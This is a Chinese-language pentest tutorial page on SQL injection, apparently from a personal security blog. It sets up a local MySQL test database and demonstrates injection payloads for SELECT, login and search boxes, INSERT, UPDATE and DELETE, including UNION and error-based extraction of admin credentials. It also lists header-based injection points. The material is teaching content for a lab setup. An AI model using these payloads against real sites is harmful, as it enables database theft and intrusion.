@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="深入透彻理解 sql注入"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>深入透彻理解 sql注入 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2014/11/09/sqli-readme/">
+                深入透彻理解 sql注入
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2014-11-09</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/pentest/">pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 首先,创建测试库,表,准备好测试数据:</p>
+<p>建库:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">C:\&gt;mysql -uroot -p</div><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> create database sqli;</span></div><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> show databases;</span></div><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> use sqli;</span></div></pre></td></tr></table></figure></p>
+<p>建表  personal_info(人员信息表),admin(假设为网站管理表,里面存的是网站后台管理员的账号密码):<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">create</span> table <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> <span class="symbol">`personal_info`</span>(</div><div class="line">    -&gt; <span class="symbol">`id`</span> int unsigned <span class="keyword">not</span> <span class="literal">null</span> auto_increment,</div><div class="line">    -&gt; <span class="symbol">`name`</span> varchar(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    -&gt; <span class="symbol">`age`</span> int <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    -&gt; <span class="symbol">`phonenu`</span> varchar(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">unique</span>,</div><div class="line">    -&gt; <span class="symbol">`email`</span> varchar(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">unique</span>,</div><div class="line">    -&gt; <span class="symbol">`sex`</span> varchar(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span> default <span class="string">'man'</span>,</div><div class="line">    -&gt; <span class="symbol">`birthday`</span> date <span class="keyword">not</span> <span class="literal">null</span> default <span class="string">'1991-01-01'</span>,</div><div class="line">    -&gt; <span class="keyword">primary</span> <span class="keyword">key</span>(<span class="symbol">`id`</span>),</div><div class="line">    -&gt; <span class="keyword">index</span> username_index(<span class="symbol">`name`</span>),</div><div class="line">    -&gt; <span class="keyword">index</span> userpass_index(<span class="symbol">`phonenu`</span>)</div><div class="line">    -&gt; )ENGINE=MyISAM DEFAULT CHARSET=utf8 <span class="keyword">collate</span> utf8_general_ci;</div></pre></td></tr></table></figure></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">create</span> table <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> <span class="symbol">`admin`</span>(</div><div class="line">    -&gt; <span class="symbol">`id`</span> int unsigned <span class="keyword">not</span> <span class="literal">null</span> auto_increment,</div><div class="line">    -&gt; <span class="symbol">`username`</span> varchar(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    -&gt; <span class="symbol">`passwd`</span> varchar(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    -&gt; <span class="symbol">`email`</span> varchar(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">unique</span>,</div><div class="line">    -&gt; <span class="keyword">primary</span> <span class="keyword">key</span>(<span class="symbol">`id`</span>),</div><div class="line">    -&gt; <span class="keyword">index</span> username_index(<span class="symbol">`username`</span>),</div><div class="line">    -&gt; <span class="keyword">index</span> userpass_index(<span class="symbol">`passwd`</span>)</div><div class="line">    -&gt; )ENGINE=MyISAM DEFAULT CHARSET=utf8 <span class="keyword">collate</span> utf8_general_ci;</div></pre></td></tr></table></figure>
+<p>0x02 理解 sql注入产生的根因:<br>&nbsp;&nbsp;&nbsp;&nbsp;脚本在接收前台传过来的数据时,没有对该数据进行很好的安全检查就直接丢到数据库中去操作,导致入侵者在前台随正常数据一起提交过来的恶意sql语句也被一并带入数据库中执行[各种子查询,联合查询…],也就是说,注入的本质,只是数据库本身,与后端脚本,系统平台无关</p>
+<p>0x03 我们利用 sql注入到底可以干些什么<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在当前数据库用户权限够的时候,一般为数据库管理员</div></pre></td></tr></table></figure></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">执行系统命令,但这并不直接就等于’提权’,具体权限的大小还要取决于你服务用户的系统权限</div><div class="line">写文件,比如,我们可能会尝试往目标网站目录中写webshell,但能不能写进去,还要看目录具体权限</div><div class="line">读文件,尝试读取带有账号密码的各类敏感配置文件,然后再想办法配合其它的漏洞一起利用</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在当前数据库用户权限一般的时候,比如,只能在指定的库中进行正常的增删改查</div></pre></td></tr></table></figure>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">像这种情况,一般我们可能会尝试查出目标网站管理员的账号和密码hash,然后再登到后台传webshell</div><div class="line">或者搜集各种能搜集到<span class="string">[有权限]</span>的各类用户密码数据,时刻为后面的字典作准备,以备不时之需</div></pre></td></tr></table></figure>
+<p>0x04 先理解一些最简单的sql注入漏洞语句原型及闭合方法:</p>
+<p>最常见的 select 查询注入:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于select 的注入,也可能会是我们在实战中遇到的最多的一种注入语句,实际上在前端涉及增删改的操作一般都非常少,除非像那种论坛程序,对于大多数普通的cms而言,前端用户的大多数操作可能都是在点击链接,然后把对应的参数值传给后端脚本,然后脚本再到数据库中去查,之后再把查询的结果返回给前端页面显示给用户</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">标准数字型注入语句:</div><div class="line">mysql&gt; <span class="keyword">select</span> * from personal_info where id=<span class="number">3</span>;</div><div class="line"></div><div class="line">数字型sql注入利用,数字嘛,也不存在什么闭合,直接跟上sql,就可以一下就把网站管理员的账号密码都查出来:</div><div class="line">mysql&gt; <span class="keyword">select</span> * from personal_info where id=-<span class="number">3</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">username</span>,<span class="title">passwd</span>,3,4,5,6,7 <span class="title">from</span> <span class="title">admin</span>;</span></div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">标准字符型注入语句:</div><div class="line">mysql&gt; select * <span class="keyword">from</span> personal_info where <span class="attribute">name</span>=<span class="string">'fedora'</span>;</div><div class="line"></div><div class="line">字符型sql注入利用,想办法闭合单引号,<span class="keyword">and</span>后面可随意跟上各种子查询就可以把所有数据遍历出来了</div><div class="line">mysql&gt; select * <span class="keyword">from</span> personal_info where <span class="attribute">name</span>=<span class="string">'fedora'</span> <span class="keyword">and</span> <span class="attribute">12</span>=12 -- -; '</div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">各种常见的登陆框注入漏洞原型sql语句:</div><div class="line">mysql&gt; select * <span class="keyword">from</span> admin where <span class="attribute">username</span>=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="attribute">passwd</span>=<span class="string">'abc123'</span>;</div><div class="line"></div><div class="line">具体利用方法如下,依然是闭合前面注释后面,在<span class="keyword">and</span>后面跟上各种子查询,直到把所有想要的数据都遍历出来:</div><div class="line">mysql&gt; select * <span class="keyword">from</span> admin where <span class="attribute">username</span>=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="attribute">12</span>=12 -- - <span class="attribute">passwd</span>=<span class="string">'abc123'</span>;</div></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">针对各类搜索框注入的漏洞原型sql语句:</div><div class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> personal_info <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">'%ka%'</span>;</div><div class="line"></div><div class="line">具体利用方法 也非常简单,只需要前后的单引号和通配符都闭合掉即可保证语句的正常执行</div><div class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> personal_info <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">'%%'</span> <span class="keyword">and</span> <span class="number">12</span>=<span class="number">12</span> -- +%<span class="string">';</span></div></pre></td></tr></table></figure>
+<p>insert 注入利用核心:<br>&nbsp;&nbsp;&nbsp;&nbsp;因为一些功能需求,在前端可能会有很多需要录入各种用户信息的表单,丢给后端脚本以后,脚本会把传过来的这些数据再插到数据库,例如典型的基于各种形式的个人中心功能,一旦遇到了,都可以随便尝试insert注入,注意,想成功利用insert注入有个必要的前提,就是你一定要知道自己插入的数据在前端的什么地方显示,如果别人只是单单搜集用户信息,然后插到数据库中,并没有在前端页面上显示,即使你知道它存在insert注入也是个鸡肋</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">漏洞语句原型:</div><div class="line">mysql&gt; insert into personal_info(*) values('injection',<span class="number">123</span>,'<span class="number">123456789011</span>','sqli@inection.org','man','<span class="number">0000-00-00</span>');</div><div class="line"></div><div class="line">利用如下,注意这里的闭合方法,insert前后字段的个数和数据类型务必一致,不然是闭合不了的,具体该怎么确定字段个数呢,其实很简单,你就一位位的字段递增,直到它返回正常为止,然后再在爆出来的字段上查数据就可以了</div><div class="line">mysql&gt; insert into personal_info(name,age,phonenu,email,sex,birthday) values('injection',<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)-- -<span class="number">123</span>,'<span class="number">123456789011</span>','sqli@inection.org','man','<span class="number">0000-00-00</span>');</div></pre></td></tr></table></figure>
+<p>update 注入利用核心:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于update利用的点有两个,一个是在set的时候,如果set的是一个从前端传过来的变量,结果可想而知,另一个则是where后面的条件,因为这个条件也是可以从前端传过来的,这个后果想必就应该清楚了,相对于insert可能会比较麻烦的一点的是,update一般都是在set一个新值,这也就意味着我们在闭合的时候,在前端很可能是没有任何回显的,这样的话我们在实际查询数据的时候可能就要费点儿劲了,具体利用过程如下</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">漏洞原型语句:</div><div class="line">mysql&gt; <span class="keyword">update</span> personal_info <span class="keyword">set</span> email = <span class="string">'flow@yeah.net'</span> <span class="keyword">where</span> name=<span class="string">'fedora'</span>;</div><div class="line"></div><div class="line">漏洞利用语句,其实,这里是利用mysql自身的报错特性来查数据的,但大多数情况下,稍微有点儿尝试的目标站一般都会接收页面错误,这时你依然可以利用盲注的来查数据,方法大同小异</div><div class="line">mysql&gt; <span class="keyword">update</span> personal_info <span class="keyword">set</span> email=<span class="string">''</span>*(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(*),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">select</span> concat(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>))) <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)* <span class="string">''</span> <span class="keyword">where</span> name=<span class="string">'fedora'</span>;</div></pre></td></tr></table></figure>
+<p>关于对delete注入的利用:<br>&nbsp;&nbsp;&nbsp;&nbsp;对于delete语句,我们唯一能控制的地方可能就只有where后面的条件了,清晰明白这一点之后,剩下的事情就很好办了,说实话,在现在的web程序里,在前台涉及到delete的操作非常少,可以说几乎是没有,不过有时还是可以在后台尝试下,尤其在权限特别高的时候,至于怎么利用它来查数据,跟update差不太多,基本也是靠报错或者盲注来搞,具体利用过程如下<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">漏洞原型sql语句:</div><div class="line">mysql&gt; <span class="keyword">delete</span> <span class="keyword">from</span> personal_info <span class="keyword">where</span> id=<span class="string">'fedora'</span>;</div><div class="line"></div><div class="line">针对性注入利用,这个闭合其实跟<span class="keyword">select</span>的时候差不多,无非就是数字或者字符串,数字就不存在什么闭合了,如果是字符串,注意闭合掉前后的单引号即可</div><div class="line">mysql&gt; <span class="keyword">delete</span> <span class="keyword">from</span> personal_info <span class="keyword">where</span> id=<span class="string">'fedora'</span> <span class="keyword">or</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),Concat((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))y <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> y)x) -- +<span class="string">';</span></div></pre></td></tr></table></figure></p>
+<p>0x05 在对sql注入有了基本的了解之后,再来详细看看到底哪些地方容易出现sql注入,实战知道从哪儿入手<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">get</span>请求的url,正常情况下这里应该是最先会尝试的地方</div><div class="line"><span class="built_in">post</span>数据字段中,数据较多时一般都会用<span class="built_in">post</span>传,会是个不错的入手点</div><div class="line">cookie中传的数据,有些还可能会把一些参数放在cookie中传,所以这儿也会是个不错的入手点</div><div class="line">Referer本身用来记录上一个页面的url,但一旦被存到数据库中之后又被带入查询,你懂的 </div><div class="line">User-agent 本身用来记录客户端信息,只要被记录到数据库之后又被带入查询一样可被利用</div><div class="line">X-Forwarded-For 本身专门用来记录客户端真实ip,如果脚本在处理时把它也带到数据库中去查询...</div><div class="line">宽字节[双字节],	主要是由于前后端编码不统一造成理解歧义</div><div class="line">只要是你发现会和后端数据库交互的地方全都可以随便尝试,并不仅限于我上面提到的这些...</div></pre></td></tr></table></figure></p>
+<p>0x06 最后,再来简单看下几种主流关系数据库的报错信息都大概是个什么样子,先混个脸熟,后面会再详细说<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Mysql:</div><div class="line"><span class="keyword">ERROR </span>1064 (42000): You have an error in your SQL syntax;</div></pre></td></tr></table></figure></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Mssql:</div><div class="line">Server Error <span class="keyword">in</span> <span class="string">'/sportpavilion'</span> Application.</div><div class="line">Unclosed quotation mark <span class="keyword">after</span> <span class="keyword">the</span> <span class="keyword">character</span> <span class="keyword">string</span> <span class="string">''</span>.</div></pre></td></tr></table></figure>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Oracle:</div><div class="line">[<span class="string">Oracle</span>][<span class="symbol">ODBC</span>][<span class="string">Ora</span>]ORA-01756:</div></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Postgresql:</div><div class="line">Warning: pg_query() [function.pg-<span class="keyword">query</span>]: <span class="keyword">Query</span> failed: <span class="keyword">ERROR</span>: <span class="keyword">syntax</span> <span class="keyword">error</span> at or near <span class="string">"\"</span> at character 53</div></pre></td></tr></table></figure>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Sqlite3:</div><div class="line"><span class="keyword">Error: </span>HY000</div></pre></td></tr></table></figure>
+<p>0x07 下一阶段准备<br>&nbsp;&nbsp;&nbsp;&nbsp;关于sql注入的基础科普就先简单到这里了,接下来,会再专门针对每种数据库具体的手工注入方法及注意事项做更详细的说明,待续…</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/pentest/">#pentest</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
